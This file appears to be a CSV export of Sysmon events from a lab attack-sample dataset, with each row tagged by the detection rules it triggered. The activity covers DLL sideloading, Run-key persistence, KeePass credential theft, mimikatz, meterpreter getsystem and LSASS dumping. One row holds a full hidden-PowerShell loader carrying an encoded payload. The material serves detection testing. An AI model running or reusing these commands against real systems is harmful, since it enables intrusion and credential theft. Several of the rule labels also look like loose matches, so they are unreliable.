2019-04-27T15:57:53.650113+00:00,UAC Bypass Using Windows Media Player - File,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/Malware/DE_timestomp_and_dll_sideloading_and_RunPersist.evtx,1,Microsoft-Windows-Sysmon,11,6581,IEWIN7,"ProcessGuid: 365ABB72-7C01-5CC4-0000-00102B3E0C00
CreationUtcTime: 2019-04-27 15:57:53.634
UtcTime: 2019-04-27 15:57:53.634
ProcessId: 2680
RuleName: ''
TargetFilename: C:\Users\IEUser\AppData\Roaming\NvSmartMax.dll
Image: C:\Users\IEUser\Downloads\Flash_update.exe
"
2019-04-27T15:57:53.650113+00:00,Suspicious Double Extension Files;UAC Bypass Using Windows Media Player - File,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/Malware/DE_timestomp_and_dll_sideloading_and_RunPersist.evtx,1,Microsoft-Windows-Sysmon,11,6579,IEWIN7,"ProcessGuid: 365ABB72-7C01-5CC4-0000-00102B3E0C00
CreationUtcTime: 2019-04-27 15:57:53.634
UtcTime: 2019-04-27 15:57:53.634
ProcessId: 2680
RuleName: ''
TargetFilename: C:\Users\IEUser\AppData\Roaming\NvSmart.exe
Image: C:\Users\IEUser\Downloads\Flash_update.exe
"
2019-04-27T15:57:53.837613+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/Malware/DE_timestomp_and_dll_sideloading_and_RunPersist.evtx,1,Microsoft-Windows-Sysmon,1,6584,IEWIN7,"Image: C:\Users\IEUser\AppData\Roaming\NvSmart.exe
RuleName: technique_id=T1036,technique_name=Masquerading
Description: NVIDIA Smart Maximise Helper Host
TerminalSessionId: 1
ParentCommandLine: '""C:\Users\IEUser\Downloads\Flash_update.exe"" '
Product: NVIDIA Smart Maximise Helper Host version 100.01
Company: '?'
ParentProcessId: 2680
LogonGuid: 365ABB72-7AB1-5CC4-0000-0020BEF40000
Hashes: SHA1=6474D0369F97E72E01E4971128D1062F5C2B3656,MD5=09B8B54F78A10C435CD319070AA13C28,SHA256=523D28DF917F9D265CD2C0D38DF26277BC56A535145100ED82E6F5FDEAAE7256,IMPHASH=DF7251FDCE5E0D0813311EC9D52FDE93
ParentProcessGuid: 365ABB72-7C01-5CC4-0000-00102B3E0C00
ProcessId: 2992
CurrentDirectory: C:\Users\IEUser\AppData\Roaming\
ProcessGuid: 365ABB72-7C01-5CC4-0000-0010F9530C00
CommandLine: '""C:\Users\IEUser\AppData\Roaming\NvSmart.exe"" '
FileVersion: 6.14.10.100.01
User: IEWIN7\IEUser
LogonId: '0xf4be'
IntegrityLevel: High
ParentImage: C:\Users\IEUser\Downloads\Flash_update.exe
UtcTime: 2019-04-27 15:57:53.696
"
2019-04-27T15:57:53.884488+00:00,CurrentVersion Autorun Keys Modification;New RUN Key Pointing to Suspicious Folder,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/Malware/DE_timestomp_and_dll_sideloading_and_RunPersist.evtx,1,Microsoft-Windows-Sysmon,13,6593,IEWIN7,"Image: C:\Users\IEUser\AppData\Roaming\NvSmart.exe
TargetObject: HKU\S-1-5-21-3583694148-1414552638-2922671848-1000\Software\Microsoft\Windows\CurrentVersion\Run\360v
RuleName: technique_id=T1060,technique_name=Registry Run Keys / Start Folder
EventType: SetValue
ProcessId: 2992
ProcessGuid: 365ABB72-7C01-5CC4-0000-0010F9530C00
UtcTime: 2019-04-27 15:57:53.806
Details: C:\Users\IEUser\AppData\Roaming\svchost.exe
"
2019-04-27T15:57:53.931363+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/Malware/DE_timestomp_and_dll_sideloading_and_RunPersist.evtx,1,Microsoft-Windows-Sysmon,1,6594,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: technique_id=T1059,technique_name=Command-Line Interface
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Users\IEUser\AppData\Roaming\NvSmart.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2992
LogonGuid: 365ABB72-7AB1-5CC4-0000-0020BEF40000
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-7C01-5CC4-0000-0010F9530C00
ProcessId: 3076
CurrentDirectory: C:\Users\IEUser\AppData\Roaming\
ProcessGuid: 365ABB72-7C01-5CC4-0000-00105C5C0C00
CommandLine: cmd.exe /A
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0xf4be'
IntegrityLevel: High
ParentImage: C:\Users\IEUser\AppData\Roaming\NvSmart.exe
UtcTime: 2019-04-27 15:57:53.806
"
2019-04-27T15:57:54.134488+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/Malware/DE_timestomp_and_dll_sideloading_and_RunPersist.evtx,1,Microsoft-Windows-Sysmon,1,6622,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: technique_id=T1059,technique_name=Command-Line Interface
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Users\IEUser\Downloads\Flash_update.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2680
LogonGuid: 365ABB72-7AB1-5CC4-0000-0020BEF40000
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-7C01-5CC4-0000-00102B3E0C00
ProcessId: 3188
CurrentDirectory: C:\Users\IEUser\AppData\Roaming\
ProcessGuid: 365ABB72-7C02-5CC4-0000-0010FD6E0C00
CommandLine: '""C:\Windows\System32\cmd.exe"" /c del /q ""C:\Users\IEUser\Downloads\Flash_update.exe"" '
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0xf4be'
IntegrityLevel: High
ParentImage: C:\Users\IEUser\Downloads\Flash_update.exe
UtcTime: 2019-04-27 15:57:54.087
"
2019-04-27T18:47:00.046849+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/CA_keefarce_keepass_credump.evtx,1,Microsoft-Windows-Sysmon,1,7020,IEWIN7,"Image: C:\Users\Public\KeeFarce.exe
RuleName: technique_id=T1036,technique_name=Masquerading
Description: '?'
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" '
Product: '?'
Company: '?'
ParentProcessId: 3680
LogonGuid: 365ABB72-A19B-5CC4-0000-0020A8FF0000
Hashes: SHA1=C622268A9305BA27C78ECB5FFCC1D43B019847B5,MD5=07D86CD24E11C1B8F0C2F2029F9D3466,SHA256=F0D5C8E6DF82A7B026F4F0412F8EDE11A053185675D965215B1FFBBC52326516,IMPHASH=D94F14D149DD5809F1B4D1C38A1B4E40
ParentProcessGuid: 365ABB72-A22D-5CC4-0000-0010E2830900
ProcessId: 1288
CurrentDirectory: C:\Users\Public\
ProcessGuid: 365ABB72-A3A4-5CC4-0000-001084960C00
CommandLine: KeeFarce.exe
FileVersion: '?'
User: IEWIN7\IEUser
LogonId: '0xffa8'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-04-27 18:47:00.046
"
2019-04-27T18:47:00.062474+00:00,Remote Thread Created In KeePass.EXE,data/EVTX-ATTACK-SAMPLES/Credential Access/CA_keefarce_keepass_credump.evtx,1,Microsoft-Windows-Sysmon,8,7023,IEWIN7,"TargetProcessId: 2364
NewThreadId: 1920
SourceImage: C:\Users\Public\KeeFarce.exe
RuleName: ''
TargetProcessGuid: 365ABB72-A201-5CC4-0000-00104F500800
SourceProcessGuid: 365ABB72-A3A4-5CC4-0000-001084960C00
StartFunction: LoadManagedProject
SourceProcessId: 1288
StartAddress: '0x5A801260'
StartModule: C:\Users\Public\BootstrapDLL.dll
UtcTime: 2019-04-27 18:47:00.062
TargetImage: C:\Program Files\KeePass Password Safe 2\KeePass.exe
"
2019-04-27T18:55:04.710608+00:00,Remote Thread Created In KeePass.EXE,data/EVTX-ATTACK-SAMPLES/Credential Access/CA_keepass_KeeThief_Get-KeePassDatabaseKey.evtx,1,Microsoft-Windows-Sysmon,8,7070,IEWIN7,"TargetProcessId: 2364
NewThreadId: 3796
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-A201-5CC4-0000-00104F500800
SourceProcessGuid: 365ABB72-A512-5CC4-0000-0010C05E1B00
StartFunction: DbgUiRemoteBreakin
SourceProcessId: 2856
StartAddress: '0x76FAEC4B'
StartModule: C:\Windows\SYSTEM32\ntdll.dll
UtcTime: 2019-04-27 18:55:04.710
TargetImage: C:\Program Files\KeePass Password Safe 2\KeePass.exe
"
2019-04-27T18:55:04.980137+00:00,Remote Thread Created In KeePass.EXE,data/EVTX-ATTACK-SAMPLES/Credential Access/CA_keepass_KeeThief_Get-KeePassDatabaseKey.evtx,1,Microsoft-Windows-Sysmon,8,7071,IEWIN7,"TargetProcessId: 2364
NewThreadId: 1384
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
TargetProcessGuid: 365ABB72-A201-5CC4-0000-00104F500800
SourceProcessGuid: 365ABB72-A512-5CC4-0000-0010C05E1B00
StartFunction: ''
SourceProcessId: 2856
StartAddress: '0x06160000'
StartModule: ''
UtcTime: 2019-04-27 18:55:04.980
TargetImage: C:\Program Files\KeePass Password Safe 2\KeePass.exe
"
2019-04-28T16:29:42.988125+00:00,HackTool - Generic Process Access,data/EVTX-ATTACK-SAMPLES/Defense Evasion/process_suspend_sysmon_10_ga_800.evtx,1,Microsoft-Windows-Sysmon,10,7845,IEWIN7,"TargetProcessId: 748
TargetImage: C:\Windows\system32\notepad.exe
SourceThreadId: 864
RuleName: ''
GrantedAccess: '0x800'
SourceProcessGUID: 365ABB72-D3C2-5CC5-0000-0010D9790500
SourceProcessId: 860
TargetProcessGUID: 365ABB72-D3E8-5CC5-0000-0010E7D30500
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+4595c|C:\Windows\system32\KERNELBASE.dll+8185|C:\Users\IEUser\Desktop\Win32\mimikatz.exe+5b414|C:\Users\IEUser\Desktop\Win32\mimikatz.exe+5b376|C:\Users\IEUser\Desktop\Win32\mimikatz.exe+45933
UtcTime: 2019-04-28 16:29:42.988
SourceImage: C:\Users\IEUser\Desktop\Win32\mimikatz.exe
"
2019-04-29T20:59:14.447313+00:00,Malicious Named Pipe Created,data/EVTX-ATTACK-SAMPLES/Lateral Movement/lm_sysmon_18_remshell_over_namedpipe.evtx,1,Microsoft-Windows-Sysmon,18,8046,IEWIN7,"ProcessGuid: 365ABB72-D9C4-5CC7-0000-0010EA030000
UtcTime: 2019-04-29 20:59:14.430
ProcessId: 4
RuleName: ''
PipeName: \46a676ab7f179e511e30dd2dc41bd388
Image: System
"
2019-04-29T20:59:21.539311+00:00,Hacktool - EDR-Freeze Execution;Non Interactive PowerShell Process Spawned;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/lm_sysmon_18_remshell_over_namedpipe.evtx,1,Microsoft-Windows-Sysmon,1,8048,IEWIN7,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RuleName: ''
Description: Windows PowerShell
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3940
LogonGuid: 365ABB72-5B3A-5CC7-0000-002096080100
Hashes: SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C
ParentProcessGuid: 365ABB72-6231-5CC7-0000-00104CF71800
ProcessId: 3376
CurrentDirectory: C:\Users\IEUser\Desktop\invoke-pipeshell-master\
ProcessGuid: 365ABB72-65A9-5CC7-0000-00104E5C2400
CommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -s -NoLogo -NoProfile'
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x10896'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-04-29 20:59:21.539
"
2019-04-29T20:59:22.144046+00:00,Hacktool - EDR-Freeze Execution;Local Accounts Discovery;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/lm_sysmon_18_remshell_over_namedpipe.evtx,1,Microsoft-Windows-Sysmon,1,8050,IEWIN7,"Image: C:\Windows\System32\whoami.exe
RuleName: ''
Description: whoami - displays logged on user information
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -s -NoLogo -NoProfile'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3376
LogonGuid: 365ABB72-5B3A-5CC7-0000-002096080100
Hashes: SHA1=DC058F52AD8ACBD316827B6DCAC2434AB3CC515C,MD5=0EBF71E33EF09CA65D9683AFA999C473,SHA256=599EFD455AEEEFE2044A9B597061F271595033F5D0DF2C99DFDBCA8394BBCEC3,IMPHASH=C5352B949915AB8CD5E1844790D19274
ParentProcessGuid: 365ABB72-65A9-5CC7-0000-00104E5C2400
ProcessId: 2116
CurrentDirectory: C:\Users\IEUser\Documents\
ProcessGuid: 365ABB72-65AA-5CC7-0000-00104D882400
CommandLine: '""C:\Windows\system32\whoami.exe""  /all'
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x10896'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-04-29 20:59:22.128
"
2019-04-29T20:59:55.472171+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/lm_sysmon_18_remshell_over_namedpipe.evtx,1,Microsoft-Windows-Sysmon,1,8052,IEWIN7,"Image: C:\Windows\System32\slui.exe
RuleName: ''
Description: Windows Activation Client
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 600
LogonGuid: 365ABB72-5B3A-5CC7-0000-002096080100
Hashes: SHA1=E7AB97F2AF8DE7BBED418E599D05C78C9B28DC8F,MD5=D861EB4D6719D6738270E6A376B87F18,SHA256=CB6FAAF9FFBC91A4F306A95D4472EE23715C91B06CE59394D6A5C23A4F4B9476,IMPHASH=B54B63A98C9E12C1902D75D180ABBF38
ParentProcessGuid: 365ABB72-D9C7-5CC7-0000-0010AD700000
ProcessId: 2244
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-65CB-5CC7-0000-001002202600
CommandLine: C:\Windows\System32\slui.exe -Embedding
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0x10896'
IntegrityLevel: High
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-04-29 20:59:55.472
"
2019-04-30T07:46:15.199614+00:00,Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_13_1_meterpreter_getsystem_NamedPipeImpersonation.evtx,1,Microsoft-Windows-Sysmon,13,8573,IEWIN7,"Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\services\msdhch\Start
RuleName: ''
EventType: SetValue
ProcessId: 468
ProcessGuid: 365ABB72-F6A1-5CC7-0000-001004550000
UtcTime: 2019-04-30 07:46:15.168
Details: DWORD (0x00000003)
"
2019-04-30T07:46:15.199614+00:00,Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_13_1_meterpreter_getsystem_NamedPipeImpersonation.evtx,1,Microsoft-Windows-Sysmon,13,8574,IEWIN7,"Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\services\msdhch\ImagePath
RuleName: ''
EventType: SetValue
ProcessId: 468
ProcessGuid: 365ABB72-F6A1-5CC7-0000-001004550000
UtcTime: 2019-04-30 07:46:15.168
Details: cmd.exe /c echo msdhch > \\.\pipe\msdhch
"
2019-04-30T07:46:15.215239+00:00,Abused Debug Privilege by Arbitrary Parent Processes;HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;Potential Meterpreter/CobaltStrike Activity;Potentially Suspicious CMD Shell Output Redirect;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_13_1_meterpreter_getsystem_NamedPipeImpersonation.evtx,1,Microsoft-Windows-Sysmon,1,8575,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\services.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 468
LogonGuid: 365ABB72-F6A1-5CC7-0000-0020E7030000
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-F6A1-5CC7-0000-001004550000
ProcessId: 4088
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-FD47-5CC7-0000-00106AF61D00
CommandLine: cmd.exe /c echo msdhch > \\.\pipe\msdhch
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\services.exe
UtcTime: 2019-04-30 07:46:15.183
"
2019-04-30T07:46:15.246489+00:00,Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/sysmon_13_1_meterpreter_getsystem_NamedPipeImpersonation.evtx,1,Microsoft-Windows-Sysmon,13,8576,IEWIN7,"Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\services\msdhch\Start
RuleName: ''
EventType: SetValue
ProcessId: 468
ProcessGuid: 365ABB72-F6A1-5CC7-0000-001004550000
UtcTime: 2019-04-30 07:46:15.230
Details: DWORD (0x00000004)
"
2019-04-30T10:12:45.583363+00:00,Malicious PowerShell Scripts - FileCreation;Startup Folder File Write;Suspicious Startup Folder Persistence;UAC Bypass Using Windows Media Player - File,data/EVTX-ATTACK-SAMPLES/Defense Evasion/sysmon_2_11_evasion_timestomp_MACE.evtx,1,Microsoft-Windows-Sysmon,11,8930,IEWIN7,"ProcessGuid: 365ABB72-1EFA-5CC8-0000-0010D3DE1C00
CreationUtcTime: 2019-04-30 10:12:45.583
UtcTime: 2019-04-30 10:12:45.583
ProcessId: 3292
RuleName: ''
TargetFilename: C:\Users\IEUser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bs.ps1
Image: C:\Windows\system32\cmd.exe
"
2019-04-30T12:43:43.784179+00:00,Potentially Suspicious GrantedAccess Flags On LSASS,data/EVTX-ATTACK-SAMPLES/Credential Access/CA_sysmon_hashdump_cmd_meterpreter.evtx,1,Microsoft-Windows-Sysmon,10,9065,IEWIN7,"TargetProcessId: 492
TargetImage: C:\Windows\system32\lsass.exe
SourceThreadId: 2284
RuleName: ''
GrantedAccess: '0x1f1fff'
SourceProcessGUID: 365ABB72-4055-5CC8-0000-0010769D0B00
SourceProcessId: 1532
TargetProcessGUID: 365ABB72-3FE0-5CC8-0000-00107E590000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+4595c|C:\Windows\system32\KERNELBASE.dll+8185|UNKNOWN(01B51606)|UNKNOWN(01B51F41)|UNKNOWN(01B51515)|UNKNOWN(014A7486)|UNKNOWN(014A73A0)|UNKNOWN(014A78A3)|C:\Windows\system32\kernel32.dll+4ef8c|C:\Windows\SYSTEM32\ntdll.dll+6367a|C:\Windows\SYSTEM32\ntdll.dll+6364d
UtcTime: 2019-04-30 12:43:43.784
SourceImage: \\VBOXSVR\HTools\voice_mail.msg.exe
"
2019-04-30T12:43:43.784179+00:00,Password Dumper Remote Thread in LSASS,data/EVTX-ATTACK-SAMPLES/Credential Access/CA_sysmon_hashdump_cmd_meterpreter.evtx,1,Microsoft-Windows-Sysmon,8,9060,IEWIN7,"TargetProcessId: 492
NewThreadId: 1744
SourceImage: \\VBOXSVR\HTools\voice_mail.msg.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3FE0-5CC8-0000-00107E590000
SourceProcessGuid: 365ABB72-4055-5CC8-0000-0010769D0B00
StartFunction: ''
SourceProcessId: 1532
StartAddress: '0x001A0000'
StartModule: ''
UtcTime: 2019-04-30 12:43:43.784
TargetImage: C:\Windows\System32\lsass.exe
"
2019-04-30T12:43:43.784179+00:00,Password Dumper Remote Thread in LSASS,data/EVTX-ATTACK-SAMPLES/Credential Access/CA_sysmon_hashdump_cmd_meterpreter.evtx,1,Microsoft-Windows-Sysmon,8,9066,IEWIN7,"TargetProcessId: 492
NewThreadId: 3656
SourceImage: \\VBOXSVR\HTools\voice_mail.msg.exe
RuleName: ''
TargetProcessGuid: 365ABB72-3FE0-5CC8-0000-00107E590000
SourceProcessGuid: 365ABB72-4055-5CC8-0000-0010769D0B00
StartFunction: ''
SourceProcessId: 1532
StartAddress: '0x001A0000'
StartModule: ''
UtcTime: 2019-04-30 12:43:43.784
TargetImage: C:\Windows\System32\lsass.exe
"
2019-04-30T20:26:51.949839+00:00,Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_sysmon_psexec_smb_meterpreter.evtx,1,Microsoft-Windows-Sysmon,13,9805,IEWIN7,"Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\services\hello\Start
RuleName: ''
EventType: SetValue
ProcessId: 460
ProcessGuid: 365ABB72-2586-5CC9-0000-0010DC530000
UtcTime: 2019-04-30 20:26:51.934
Details: DWORD (0x00000003)
"
2019-04-30T20:26:51.981089+00:00,Potential CobaltStrike Service Installations - Registry;PowerShell as a Service in Registry;Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_sysmon_psexec_smb_meterpreter.evtx,1,Microsoft-Windows-Sysmon,13,9806,IEWIN7,"Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\services\hello\ImagePath
RuleName: ''
EventType: SetValue
ProcessId: 460
ProcessGuid: 365ABB72-2586-5CC9-0000-0010DC530000
UtcTime: 2019-04-30 20:26:51.934
Details: '%%COMSPEC%% /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b=''powershell.exe''}else{$b=$env:windir+''\syswow64\WindowsPowerShell\v1.0\powershell.exe''};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=''-noni -nop -w hidden -c &([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(''''H4sIAIuvyFwCA7VW+2/aSBD+OZH6P1gVErZCMA60aSJVujVPE5xADITHodNir+0lay/Ya169/u83Btym1/SuPeksHruzM7Mz33w7azcJbUF5KM2DxU1J+vTm/KyLIxxIco6MClKOmsrZGQhz5Er6KMlTtFzWeIBpOLu9rSZRREJxnBebRKA4JsGcURLLivSn9OSTiFw+zBfEFtInKfdHscn4HLOT2q6KbZ9Ilyh00rUOt3EaSdFaMirk/O+/55XppTYr1lcJZrGct3axIEHRYSyvSJ+VdMP+bknkvEntiMfcFcUnGpavioMwxi65B29rYhLhcyfOK5ADfCIikiiUIJvU/Lgo52HYjbiNHCcicZwvSNPU8XQ2+02ennZ9TEJBA1I0QkEivrRItKY2iYstHDqMPBJ3BlaWiGjozRQF1Nb8mci5MGGsIP2KG/mebDLMftZIfmkEWl0RKYW0gn/P0uROwsjRLv9KmFBzBZ5j3QGyz2/O35y7GUVWdyP6kiEwOpsexgQCk7s8pge9j1KpIJmwCRY82sE0148Sosy+wCrl3Gbhx9ZapgqKfP+0BdF0yKkzA5NTHXMbkUp/zMYacWlIarsQB9TOCCe/Bi5xGTnkV8zU7iEkOX9aIE6NMOJhkQKW1vg7s3pAxRdbPaHMIRGyoUAxRAW1U74N5lgDOW+EJgkAn+McSJdzgeYk0z5Re5ftns5BKV9lOI4LUjeBc2YXJItgRpyChMKYnpZQIvhhmP8arpkwQW0ci8zdTDmieNqtysNYRIkNBYPM+9aS2BSzFIiC1KIO0XcW9bJd86/CUMWMAfvB0xrKAJI0fUukNIicNLumUrSIMIIlIwFoHA57g2EPjvaJ4QfWYI84+W+jyxh8pGuKQpb+i9igtBbjoiANaSSgY6SIpuz5L1u/6BQQRDUipwLI2ZmY6juRMjm3H6c8PKFxyD0SkHcj4oGOY/K+cuwJ8lv1gVYRPGMjZKatP1MNbahmmPAd0LLBa9fOXXvRUqPa1neRERtmq1vrtVqVddsaVoRVN8Rd1xBmfbRYWKj1OBiLiYFafVp6Hlf2yzbdWx3kjLfq+72+35T07X7hOe645rretWs9au8atPNU7emlK9yp1ZPOk77RS5W4TjetHh30ntsNMR8PGR64qjfSbjDddqLFUOPm3kCo6ZftfdsdNn3T2Y1blCzUUof2UA+hO/txMGh6S68ZI/VmuKoG3h1CRh8jA9WHu/Y7pvcGDR0N6noPP/Bu+aKmahNnVW9MRrgdMKfZUrXxCDkoUvuer10/+GGKE/b0lZ7qoM5k11BBp1tBrcoV3U9WvaaH6qAzDDjCDfo8uBiBz/s+2DwNNIcjERojVR16qodcyx9jpIO2vkINnVd3H7pmVx0Or3xt/qz5EDMZrT+YbXTRsLuqql4Ec/hVkW0ut+FI31yvvZbF7/AdHq4nZVXrb5ouWqGLC13T56JVL7fXsG9fvRl8fJtyB8iTc/f+5AUvftTATRzFPmbAF+jN2cls8Khx6rhdTlMLWT5ezs8kCgmDCw6uwIzliDFup83+0Jzhojm2//Q2GsCwfPXqSJG+KCpfr4FMdHs7gTDh3OzHxQ4JPeEXSttyqQRdvbStlCDJn0+sypc7GRwV0jvhgMvRLzv4VdKzlPMfh1Hlf4brdIZ9+HP+Da6vsn9Y/SkIS4Vjyt+JvxX8EqK/nvsTpgJULehDjBxvv9chOJHjxYvBoTRQfff0pK91D4m4vIcXhjfnfwFhhx3MPQoAAA==''''))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=''Hidden'';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);""'
"
2019-04-30T20:26:52.090464+00:00,Abused Debug Privilege by Arbitrary Parent Processes;Base64 Encoded PowerShell Command Detected;Gzip Archive Decode Via PowerShell;HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;Potential Meterpreter/CobaltStrike Activity;Suspicious FromBase64String Usage On Gzip Archive - Process Creation;Suspicious PowerShell Invocations - Specific - ProcessCreation;Suspicious SYSTEM User Process Creation;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_sysmon_psexec_smb_meterpreter.evtx,1,Microsoft-Windows-Sysmon,1,9807,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\services.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 460
LogonGuid: 365ABB72-2586-5CC9-0000-0020E7030000
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-2586-5CC9-0000-0010DC530000
ProcessId: 3348
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-AF8B-5CC8-0000-00101C1A1900
